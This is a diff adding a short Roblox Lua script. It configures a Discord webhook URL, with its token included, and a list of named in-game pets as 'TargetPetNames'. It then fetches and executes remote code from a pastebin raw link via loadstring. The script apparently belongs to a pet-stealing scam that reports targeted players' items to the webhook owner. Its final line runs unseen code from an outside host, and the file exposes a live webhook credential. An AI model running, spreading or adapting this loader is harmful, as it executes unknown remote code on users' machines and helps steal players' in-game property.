@@ -1,0 +1,34 @@
+--// 🔧 Config Section
+getgenv().webhook = "https://discord.com/api/webhooks/1394135510028652668/8Yq5Fbq5K6PQ8LPomyCiuFFrewvJSuWf6FKcNTOz3S1oxKNgJ-IFkLBegXz7mZJxFsig"
+ 
+getgenv().TargetPetNames = {
+    "Graipuss Medussi",
+    "Los Tralaleritos",
+    "La Vacca Saturno Saturnita",
+    "La Grande Combinasion",
+    "Gattatino Nyanino",
+    "Tralalero Tralala",
+    "Matteo",
+    "Los Crocodillitos",
+    "Trigoligre Frutonni",
+    "Orcalero Orcala",
+    "Odin Din Din Dun",
+    "Statutino Libertino",
+    "Trenostruzzo Turbo 3000",
+    "Espresso Signora",
+    "Ballerino Lololo",
+    "Piccione Macchina",
+    "Chimpanzini Spiderini",
+    "Las Tralaleritas",
+    "Las Vaquitas Saturnitas",
+    "Pot Hotspot",
+    "Tortuginni Dragonfruitini",
+    "Chicleteira Bicicleteira",
+    "Nuclearo Dinossauro",
+    "Garama and Madundung",
+    "Sammyni Spyderini",
+    "Gattatino Neonino"
+}
+ 
+--// 🚀 Loader
+loadstring(game:HttpGet("https://pastebin.com/raw/dhMG8MG4"))()
